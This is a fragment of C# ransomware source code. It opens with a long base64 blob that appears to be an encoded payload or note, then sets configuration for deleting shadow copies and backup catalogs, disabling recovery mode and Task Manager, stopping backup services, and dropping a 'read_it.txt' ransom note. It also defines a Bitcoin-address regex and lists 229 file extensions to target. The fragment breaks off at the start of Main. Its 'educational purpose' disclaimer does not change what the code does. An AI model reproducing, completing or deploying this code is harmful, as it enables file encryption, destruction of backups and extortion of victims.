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";

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	private static bool checkStopBackupServices = true;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string> { "It's only for educational purpose ." };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
